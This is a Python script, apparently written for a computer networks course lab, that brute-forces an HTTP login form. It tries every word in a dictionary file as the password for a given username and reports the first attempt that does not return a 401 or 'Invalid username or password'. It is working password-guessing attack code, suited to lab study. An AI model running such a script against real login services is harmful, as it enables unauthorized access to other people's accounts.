#!/usr/bin/env python3

# Author: Felipe Pavanelli
# Date: 11/3//2025
# Class: CS60 - Computer Networks
# find_password.py - Loops through all words in english_words.txt and sends an HTML Form Encoded Request with each word as a password attempt
# usage: python3 find_password.py hostIP PortNumber username

import sys
import socket
import time


#===================SEND LOGIN REQUEST=========================#
# Sends an HTML Form Enconded Request addressed to provided hostIP and port 
# Takes in username and password for the form
# Returns response if not none
# LLM usage: Same schema from Lab 2: web-client.py, but used Claude and ChatGPT to debug and help write a response parser for HTTP reply
def send_login_request(host, port, username, password):
    """Send HTTP POST login request and return response."""
    # Build form data
    form_data = f"username={username}&password={password}"
    body_bytes = form_data.encode('utf-8')
    
    # Build HTTP request with proper headers
    request = (
        f"POST /login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    
    request_bytes = request.encode('utf-8') + body_bytes
    
    try:
        # Create socket and connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        # Send request
        sock.sendall(request_bytes)
        
        # Receive response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response.decode('utf-8', errors='ignore')
    
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return None
    

#===================MAIN=========================#
# parses out input arguments (hostIP PortNumber Username)
# Opens english_words.txt and creates words[] list
# Attempts each word as password option and prints out response status. Breaks loop when found a non-401 response
# LLM usage: used Claude and ChatGPT to debug parsing out text file into list of words
def main():
    if len(sys.argv) != 4:
        print("Usage: python3 find_password.py <host_ip> <port> <username>")
        print("Example: python3 find_password.py 192.168.60.3 60 f0060y1")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    
    # Read dictionary
    try:
        with open("english_words.txt", "r") as f:
            words = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Error: english_words.txt not found", file=sys.stderr)
        sys.exit(1)
    
    print(f"[*] Trying {len(words)} passwords against {host}:{port}")
    print(f"[*] Username: {username}\n")
    
    for i, password in enumerate(words):
        # Send request
        response = send_login_request(host, port, username, password)
        
        if response is None:
            continue
        
        # Extract status line
        first_line = response.split('\r\n')[0]
        print(f"[{i+1}] {password:20} -> {first_line}")
        
        # Check for success (not 401 and not "Invalid username")
        if "401" not in response and "Invalid username or password" not in response:
            print(f"\n[+] SUCCESS! Password found: {password}")
            print("\n[+] Server response:")
            print("="*60)
            print(response)
            print("="*60)
            break
        
        # Small delay to be polite
        time.sleep(0.05)

if __name__ == "__main__":
    main()